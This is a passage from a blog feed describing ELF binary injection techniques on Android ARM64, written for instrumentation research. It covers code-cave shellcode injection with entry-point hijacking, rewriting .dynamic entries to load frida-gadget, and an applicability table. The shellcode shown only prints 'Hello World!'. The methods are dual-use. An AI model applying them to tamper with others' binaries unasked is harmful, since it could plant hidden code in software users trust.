&lt;/code>&lt;/pre>&lt;/div>&lt;p>This function has to return &lt;code>true&lt;/code> in order for our symbol to be returned by &lt;code>soinfo_do_lookup_impl&lt;/code>. Therefore, its binding must ensure that the symbol is globally available, i.e. either &lt;code>STB_GLOBAL&lt;/code> or &lt;code>STB_WEAK&lt;/code>, and the symbol has to be defined in relation to some section, whose index is not 0. (We have not talked about &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_soinfo.cpp;l=184">symbol version checks&lt;/a> yet that introduce further complexity if there is a section of type &lt;code>SHT_VERSYM&lt;/code>. Note that &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_soinfo.cpp;l=108">&lt;code>check_symbol_version&lt;/code>&lt;/a> also has to return &lt;code>true&lt;/code> for the symbol resolution to succeed.)&lt;/p>
&lt;p>Thus manipulating &lt;em>.dynsym&lt;/em> of an ELF - file is limited to the symbols that have a corresponding &lt;em>.gnu.hash&lt;/em> - entry.&lt;/p>
&lt;p>Combining the facts that the dynamic linker defaults to &lt;code>BIND_NOW&lt;/code> and uses hash tables like &lt;em>.gnu.hash&lt;/em> and &lt;em>.hash&lt;/em>, overwriting a &lt;em>.dynsym&lt;/em> - entry will be ignored and changes in e.g. &lt;em>.got.plt&lt;/em> will be overwritten, if there is no corresponding hash entry. Having lazy - binding would relax the situation a bit, as the symbol lookup would be delayed as much as possible, allowing further manipulations at runtime. &lt;code>BIND_NOW&lt;/code> enforces the existence of a hash table entry at startup in order for &lt;em>.dynsym&lt;/em> - based injection to work. Alternatively we could overwrite a relocation entry of type &lt;code>R_AARCH64_JUMP_SLOT&lt;/code>, which does not seem to require any other changes than in &lt;em>.rel(a).plt&lt;/em>.&lt;/p>
&lt;h3 id="dynamic---based-injection">&lt;em>.dynamic&lt;/em> - based Injection&lt;/h3>
&lt;p>Finally, the most common technique is described. This approach requires dynamic linking, i.e. if the target binary is statically linked and there is no &lt;em>.dynamic&lt;/em> - section, then this technique will &lt;strong>not&lt;/strong> work. Also we assume that all inserted &lt;em>.dynamic&lt;/em> - entries have the tag &lt;code>DT_NEEDED&lt;/code> to allow loading arbitrary shared object files. The corresponding &lt;code>d_val&lt;/code> is an offset into &lt;em>.dynstr&lt;/em>.&lt;/p>
&lt;p>The following subtechniques can be derived:&lt;/p>
&lt;ol>
&lt;li>Inserting a new &lt;em>.dynamic&lt;/em> - entry into &lt;em>.dynamic&lt;/em> and a new string into &lt;em>.dynstr&lt;/em>. Like in segment - based injection, this is the least intrusive and only reversible technique and is supported by LIEF. One issue is that it requires new memory to be inserted. E.g. on an ARM64 architecture with Android 12 (API level 31) and a NDK r23b build of a &amp;ldquo;Hello World&amp;rdquo; - application, &lt;em>.dynamic&lt;/em> is located between &lt;em>.plt&lt;/em> and &lt;em>.got&lt;/em>/&lt;em>.got.plt&lt;/em>. Therefore, inserting new memory will invalidate cross - references.&lt;/li>
&lt;li>Similar to the above, overwriting an existing &lt;em>.dynamic&lt;/em> - entry and inserting a new string results in a recomputation of all patchable references.&lt;/li>
&lt;li>Inserting a new &lt;em>.dynamic&lt;/em> - entry with a chosen string offset as &lt;code>d_val&lt;/code> requires to find a &amp;ldquo;suitable&amp;rdquo; substring in &lt;em>.dynstr&lt;/em>. Thinking of Frida, this substring should be of the form &amp;ldquo;substring.so&amp;rdquo;. This allows the use of configuration files for &lt;em>frida-gadget.so&lt;/em>.&lt;/li>
&lt;li>At last we can overwrite an existing &lt;em>.dynamic&lt;/em> - entry and use a &amp;ldquo;suitable&amp;rdquo; substring. Notice that some compilers (like e.g. gcc) like to generate a &lt;em>.dynamic&lt;/em> - entry with tag &lt;code>DT_DEBUG&lt;/code>. Its value is application - dependent. As this is marked as optional in System V gABI, it can be overwritten. If the application needs this &lt;em>.dynamic&lt;/em> - entry, then you will have to restore this entry in the initialisation function of your shared object file.&lt;/li>
&lt;/ol>
&lt;p>One main concern is that LIEF does not support using substrings. If LIEF sees that a &lt;em>.dynamic&lt;/em> - entry with tag &lt;code>DT_NEEDED&lt;/code> is inserted, it will insert a new string. Thus &lt;code>rawelf_injection&lt;/code> will be used for substring - related techniques. Also overwriting an existing &lt;em>.dynamic&lt;/em> - entry and inserting a new string is implemented by using the sequence&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">binary&lt;span style="color:#f92672">.&lt;/span>remove(binary&lt;span style="color:#f92672">.&lt;/span>dynamic_entries[index])
binary&lt;span style="color:#f92672">.&lt;/span>add_library(string)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>If the &lt;em>.dynamic&lt;/em> - entry indexed by &lt;code>index&lt;/code> is e.g. a &lt;code>DT_NEEDED&lt;/code> - entry, then LIEF will also remove the corresponding string from &lt;em>.dynstr&lt;/em>. One must be cautious when removing &lt;em>.dynamic&lt;/em> - entries with LIEF.&lt;/p>
&lt;p>Lets consider a figure that describes the last subtechnique:
&lt;img src="https://lolcads.github.io/2022/07/technique_dynamic_override_substring.png" alt="Overwrite .dynamic entry with substring">&lt;/p>
&lt;h2 id="applicability">Applicability&lt;/h2>
&lt;p>Having seen all of those techniques, we should summarise what techniques are usable and under which circumstances. For that, please see the following table. The test environment is always on AMR64 and Android 12 (API level 31). Notice that we consider LIEF as a black - box and assume its correctness to be given.&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Technique&lt;/th>
&lt;th>Subtype&lt;/th>
&lt;th>Usable&lt;/th>
&lt;th>Constraints &amp;amp; Challenges&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Insert Memory&lt;/td>
&lt;td>-&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>&lt;code>adrp&lt;/code>, invalid cross - references, inserting memory after loadable with &lt;code>p_filesz=0&lt;/code>, permissions, overlapping loadables&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Code Caves&lt;/td>
&lt;td>Extension&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>segment permissions, &lt;code>adrp&lt;/code>, overlapping loadables&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>PHT Insert&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>Insert Memory issues, possibly order of loadables, &amp;hellip;&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>PHT Overwrite&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>finding &amp;ldquo;suitable&amp;rdquo; PHT - entry, &lt;code>adrp&lt;/code> because different &lt;code>p_memsz&lt;/code>, possibly order of loadables, &amp;hellip;&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Segments&lt;/td>
&lt;td>Inject(PHT)+Inject(Memory)&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>None, unless LIEF messes up&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>Overwrite+Overwrite&lt;/td>
&lt;td>Rather no&lt;/td>
&lt;td>finding &amp;ldquo;suitable&amp;rdquo; PHT - entry, finding &amp;ldquo;suitable&amp;rdquo; segment, &lt;code>adrp&lt;/code> because different &lt;code>p_memsz&lt;/code>, possibly order of loadables&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>Overwrite+Inject&lt;/td>
&lt;td>Rather yes&lt;/td>
&lt;td>Insert Memory issues, finding &amp;ldquo;suitable&amp;rdquo; PHT - entry, possibly order of loadables&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>Inject+Overwrite&lt;/td>
&lt;td>Rather no&lt;/td>
&lt;td>Insert Memory issues, finding &amp;ldquo;suitable&amp;rdquo; segment, possibly order of loadables&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Entry Point&lt;/td>
&lt;td>-&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>need virtual address&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;em>.dynsym&lt;/em>&lt;/td>
&lt;td>Insert Symbol&lt;/td>
&lt;td>No&lt;/td>
&lt;td>Dynamic Linker always uses &lt;code>BIND_NOW&lt;/code>, need specific hash table entries&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>Overwrite Symbol&lt;/td>
&lt;td>No&lt;/td>
&lt;td>Insert Symbol issues&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;em>.dynamic&lt;/em>&lt;/td>
&lt;td>Inject(.dynamic)+Inject(.dynstr)&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>None, unless LIEF messes up&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>Overwrite+Inject&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>None, unless LIEF messes up&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>Inject+Substring&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>finding &amp;ldquo;suitable&amp;rdquo; substring&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;/td>
&lt;td>Overwrite+Substring&lt;/td>
&lt;td>Yes&lt;/td>
&lt;td>finding &amp;ldquo;suitable&amp;rdquo; substring, finding &amp;ldquo;suitable&amp;rdquo; &lt;em>.dynamic&lt;/em> - entry&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>It is needless to say that overwriting vital structures like e.g. the ELF - header will completely break the binary. Always think about it twice when considering to overwrite something.&lt;/p>
&lt;p>All in all we can see that most techniques work. I must emphasize that the above &lt;strong>table is solely based on tests on a single platform for a single binary&lt;/strong>. Although theoretically correct, in practice many techniques can still fail due to bugs in the implementation on my side or deviations from specifications and standards on the vendor&amp;rsquo;s side. Also you should take the &amp;ldquo;Usable&amp;rdquo; - column with a grain of salt: it highly assumes that the user knows what he/she is doing. Blindly injecting memory will most likely result in segmentation faults.&lt;/p>
&lt;h2 id="practical-examples">Practical Examples&lt;/h2>
&lt;p>In this section we want to see whether these techniques can be used to make Frida work. Notice that for simplicity, we will only use &lt;em>.dynamic&lt;/em> - based injection to get Frida to run. This is justified by the fact that writing shellcode that is able to either track down &lt;code>dlopen&lt;/code> and thus libc or load a shared object file manually is non - trivial. To prove that other techniques work aswell I will provide shellcode that writes a plain &amp;ldquo;Hello World!&amp;rdquo; text to stdout and exits with code &lt;code>42&lt;/code>.&lt;/p>
&lt;h3 id="experiment-setup">Experiment Setup&lt;/h3>
&lt;p>In order to test the library, one may go ahead and create an Android Virtual Device (AVD) with API level 31 or above to support aarch64 - binaries (i.e. ARM64). Then run the emulator, e.g. via console&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">emulator -avd Pixel_3_API_31
&lt;/code>&lt;/pre>&lt;/div>&lt;p>where &lt;code>emulator&lt;/code> is a tool in the Android SDK. The name of the AVD may differ.&lt;/p>
&lt;p>Then use &lt;code>adb&lt;/code> to get a shell into the emulator using&lt;/p>
&lt;pre tabindex="0">&lt;code>adb shell
&lt;/code>&lt;/pre>&lt;p>This assumes that there is only one emulator running. Otherwise you need to specify the avd or its debug port.&lt;/p>
&lt;p>Finally, cross-compile a C program of your choice by utilising the Android NDK or take a binary that is a result of the &lt;em>Ahead-Of-Time&lt;/em> step of ART. Either way you should end up with an ELF - file. When cross - compiling a C program, use&lt;/p>
&lt;pre tabindex="0">&lt;code>adb push /path/to/binary /local/data/tmp/binary
&lt;/code>&lt;/pre>&lt;p>to get the binary into the emulator.&lt;/p>
&lt;p>As the python library only runs on AMD64, you should apply the techniques before pushing the ELF - file to the emulator.&lt;/p>
&lt;h3 id="hello-world---example">Hello World - Example&lt;/h3>
&lt;p>Lets use code cave - based injection. For simplicity, we assume that there is a code cave between loadable segments.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#import lief&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> ElfInjection.Binary &lt;span style="color:#f92672">import&lt;/span> ElfBinary
&lt;span style="color:#f92672">from&lt;/span> ElfInjection.CodeInjector &lt;span style="color:#f92672">import&lt;/span> ElfCodeInjector
&lt;span style="color:#f92672">from&lt;/span> ElfInjection.Seekers.CodeCaveSeeker &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
&lt;span style="color:#75715e"># 0. Introduce artificial code cave&lt;/span>
&lt;span style="color:#75715e">#binary = lief.parse(&amp;#39;./libs/arm64-v8a/hello&amp;#39;)&lt;/span>
&lt;span style="color:#75715e">#binary.add(binary.get(lief.ELF.SEGMENT_TYPES.LOAD))&lt;/span>
&lt;span style="color:#75715e">#binary.add(binary.get(lief.ELF.SEGMENT_TYPES.LOAD))&lt;/span>
&lt;span style="color:#75715e">#binary.write(&amp;#39;./libs/arm64-v8a/hello&amp;#39;)&lt;/span>
&lt;span style="color:#75715e"># 1. Setup variables&lt;/span>
shellcode &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x0e\xa9\x8c\xd2\x8e\x8d\xad\xf2\xee&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\r\xc4\xf2\xee\xea\xed\xf2&lt;/span>&lt;span style="color:#e6db74">O&lt;/span>&lt;span style="color:#ae81ff">\x8e\x8d\xd2\x8f&lt;/span>&lt;span style="color:#e6db74">,&amp;#39;&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\xa4\xf2&lt;/span>&lt;span style="color:#e6db74">O&lt;/span>&lt;span style="color:#ae81ff">\x01\xc0\xf2\xee&lt;/span>&lt;span style="color:#e6db74">?&lt;/span>&lt;span style="color:#ae81ff">\xbf\xa9&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#ae81ff">\x00\x80&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\xd2\xe1\x03\x00\x91\xa2\x01\x80\xd2\x08\x08&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x80\xd2\x01\x00\x00\xd4&lt;/span>&lt;span style="color:#e6db74">@&lt;/span>&lt;span style="color:#ae81ff">\x05\x80\xd2\xa8\x0b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x80\xd2\x01\x00\x00\xd4&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;span style="color:#75715e"># 2. Get the binary&lt;/span>
binary &lt;span style="color:#f92672">=&lt;/span> ElfBinary(&lt;span style="color:#e6db74">&amp;#39;./libs/arm64-v8a/hello&amp;#39;&lt;/span>)
injector &lt;span style="color:#f92672">=&lt;/span> ElfCodeInjector(binary)
&lt;span style="color:#75715e"># 3. Create cave seeker and search for caves of size&lt;/span>
&lt;span style="color:#75715e"># at least 0x100&lt;/span>
seeker &lt;span style="color:#f92672">=&lt;/span> ElfSegmentSeeker(&lt;span style="color:#ae81ff">0x100&lt;/span>)
caves &lt;span style="color:#f92672">=&lt;/span> injector&lt;span style="color:#f92672">.&lt;/span>findCodeCaves(seeker)
&lt;span style="color:#75715e"># 4. Find suitable code cave...&lt;/span>
cave &lt;span style="color:#f92672">=&lt;/span> caves[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;span style="color:#75715e"># 5. Adjust a loadable segment. This should also be executable!&lt;/span>
cave&lt;span style="color:#f92672">.&lt;/span>size &lt;span style="color:#f92672">=&lt;/span> len(shellcode)
sc, _ &lt;span style="color:#f92672">=&lt;/span> injector&lt;span style="color:#f92672">.&lt;/span>injectCodeCave(&lt;span style="color:#66d9ef">None&lt;/span>, cave, shellcode)
&lt;span style="color:#75715e"># 6. Overwrite entry point to point to whereever shellcode is&lt;/span>
old &lt;span style="color:#f92672">=&lt;/span> injector&lt;span style="color:#f92672">.&lt;/span>overwriteEntryPoint(sc&lt;span style="color:#f92672">.&lt;/span>vaddr)
&lt;span style="color:#75715e"># 7. Store to file&lt;/span>
binary&lt;span style="color:#f92672">.&lt;/span>store(&lt;span style="color:#e6db74">&amp;#39;./libs/arm64-v8a/tmp&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">if&lt;/span> (__name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>):
main()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The above code will search for a code cave that is at least &lt;code>0x100&lt;/code> bytes in size. Then it will select the second match, fill the cave with shellcode and set the entry point to point to the shellcode. Notice that the code cave will be appended to an executable segment. The target is the same binary as in the next example.&lt;/p>
&lt;p>Also notice that we need to artificially introduce two loadable, executable segments in order to find a code cave. If such an action is necessary to perform code cave based injection, you must reconsider whether code cave based injection is the correct choice.&lt;/p>
&lt;h3 id="dynamic---injection-example">&lt;em>.dynamic&lt;/em> - Injection Example&lt;/h3>
&lt;p>Finally, for &lt;em>.dynamic&lt;/em> - based injection please consider the following code:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> lief
&lt;span style="color:#f92672">from&lt;/span> ElfInjection.Binary &lt;span style="color:#f92672">import&lt;/span> ElfBinary
&lt;span style="color:#f92672">from&lt;/span> ElfInjection.CodeInjector &lt;span style="color:#f92672">import&lt;/span> ElfCodeInjector
&lt;span style="color:#f92672">from&lt;/span> ElfInjection.Manipulators.DynamicManipulator &lt;span style="color:#f92672">import&lt;/span> ElfDynamicOverwriter
&lt;span style="color:#f92672">from&lt;/span> ElfInjection.Manipulators.StringManipulator &lt;span style="color:#f92672">import&lt;/span> ElfStringFinder
&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>():
&lt;span style="color:#75715e"># 1. Get the binary&lt;/span>
binary &lt;span style="color:#f92672">=&lt;/span> ElfBinary(&lt;span style="color:#e6db74">&amp;#39;./libs/arm64-v8a/hello&amp;#39;&lt;/span>)
injector &lt;span style="color:#f92672">=&lt;/span> ElfCodeInjector(binary)
&lt;span style="color:#75715e"># 2. Create overwriter&lt;/span>
dyn_overwriter &lt;span style="color:#f92672">=&lt;/span> ElfDynamicOverwriter(
tag&lt;span style="color:#f92672">=&lt;/span>lief&lt;span style="color:#f92672">.&lt;/span>ELF&lt;span style="color:#f92672">.&lt;/span>DYNAMIC_TAGS&lt;span style="color:#f92672">.&lt;/span>NEEDED,
value&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>,
index&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">6&lt;/span>
)
&lt;span style="color:#75715e"># 3. Create string finder&lt;/span>
str_finder &lt;span style="color:#f92672">=&lt;/span> ElfStringFinder()
&lt;span style="color:#75715e"># 4. Overwrite .dynamic entry with substring&lt;/span>
dyn_info &lt;span style="color:#f92672">=&lt;/span> injector&lt;span style="color:#f92672">.&lt;/span>injectDynamic(
str_finder,
dyn_overwriter
)
&lt;span style="color:#75715e"># 5. Store to file&lt;/span>
binary&lt;span style="color:#f92672">.&lt;/span>store(&lt;span style="color:#e6db74">&amp;#39;./libs/arm64-v8a/tmp&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;__main__&amp;#39;&lt;/span>:
main()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Because we are using an &lt;code>ElfStringFinder&lt;/code>, there is no user - supplied string injected into &lt;em>.dynstr&lt;/em>. Note that the user is responsible for providing the requested shared object file, e.g. by setting &lt;code>LD_LIBRARY_PATH&lt;/code>. We are manipulating the following program&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>()
{
&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>text &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Hello World!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
&lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#ae81ff">1&lt;/span>) {
write(&lt;span style="color:#ae81ff">1&lt;/span>, text, strlen(text));
sleep(&lt;span style="color:#ae81ff">1&lt;/span>);
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>compiled on AMD64, Ubuntu 20.04.1 LTS with Android NDK r23b&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ndk-build
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Investigating &lt;em>.dynamic&lt;/em> yields:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">readelf --wide --dynamic manipulated.bin
...
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libc.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libm.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libstdc++.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>libdl.so&lt;span style="color:#f92672">]&lt;/span>
0x000000000000001e &lt;span style="color:#f92672">(&lt;/span>FLAGS&lt;span style="color:#f92672">)&lt;/span> BIND_NOW
0x000000006ffffffb &lt;span style="color:#f92672">(&lt;/span>FLAGS_1&lt;span style="color:#f92672">)&lt;/span> Flags: NOW PIE
0x0000000000000001 &lt;span style="color:#f92672">(&lt;/span>NEEDED&lt;span style="color:#f92672">)&lt;/span> Shared library: &lt;span style="color:#f92672">[&lt;/span>c.so&lt;span style="color:#f92672">]&lt;/span>
0x0000000000000007 &lt;span style="color:#f92672">(&lt;/span>RELA&lt;span style="color:#f92672">)&lt;/span> 0x1490
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>To see Frida in action, we first need to set the gadget&amp;rsquo;s bind address to an IP we can connect to (i.e. not localhost):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">{
&lt;span style="color:#f92672">&amp;#34;interaction&amp;#34;&lt;/span>: {
&lt;span style="color:#f92672">&amp;#34;type&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;listen&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;address&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;lt;IP&amp;gt;&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;port&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">27042&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;on_port_conflict&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;fail&amp;#34;&lt;/span>,
&lt;span style="color:#f92672">&amp;#34;on_load&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;wait&amp;#34;&lt;/span>
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Name this file &amp;ldquo;c.config.so&amp;rdquo;.&lt;/p>
&lt;p>Now run the following in &lt;strong>separate&lt;/strong> shells to see Frida in action. The first shell should run something like this, setting up the test program.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">mv frida-gadget.so c.so
LD_LIBRARY_PATH&lt;span style="color:#f92672">=&lt;/span>. ./manipulated.bin
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And the second shell should do the tracing:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">frida-trace -H &amp;lt;IP&amp;gt;:27042 -n &lt;span style="color:#e6db74">&amp;#34;Gadget&amp;#34;&lt;/span> -i &lt;span style="color:#e6db74">&amp;#34;write&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="sources">Sources&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://cs.android.com/android">https://cs.android.com/android&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://frida.re">https://frida.re&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://frida.re/docs/gadget/">https://frida.re/docs/gadget/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/fkie-cad/ELFbin">https://github.com/fkie-cad/ELFbin&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/lief-project/LIEF">https://github.com/lief-project/LIEF&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://gitlab.com/x86-psABIs/x86-64-ABI">https://gitlab.com/x86-psABIs/x86-64-ABI&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">https://man7.org/linux/man-pages/man2/ptrace.2.html&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://man7.org/linux/man-pages/man8/ld.so.8.html">https://man7.org/linux/man-pages/man8/ld.so.8.html&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.sco.com/developers/gabi/latest/contents.html">http://www.sco.com/developers/gabi/latest/contents.html&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.sco.com/developers/gabi/latest/ch4.reloc.html">http://www.sco.com/developers/gabi/latest/ch4.reloc.html&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Exploration of the Dirty Pipe Vulnerability (CVE-2022-0847)</title><link>https://lolcads.github.io/posts/2022/06/dirty_pipe_cve_2022_0847/</link><pubDate>Mon, 06 Jun 2022 19:57:03 +0200</pubDate><guid>https://lolcads.github.io/posts/2022/06/dirty_pipe_cve_2022_0847/</guid><description>Intro This blog post reflects our exploration of the Dirty Pipe Vulnerability in the Linux kernel. The bug was discovered by Max Kellermann and described here. If you haven&amp;rsquo;t read the original publication yet, we&amp;rsquo;d suggest that you read it first (maybe also twice ;)). While Kellermann&amp;rsquo;s post is a great resource that contains all the relevant information to understand the bug, it assumes some familiarity with the Linux kernel. To fully understand what&amp;rsquo;s going on we&amp;rsquo;d like to shed some light on specific kernel internals.</description><content>&lt;h2 id="intro">Intro&lt;/h2>
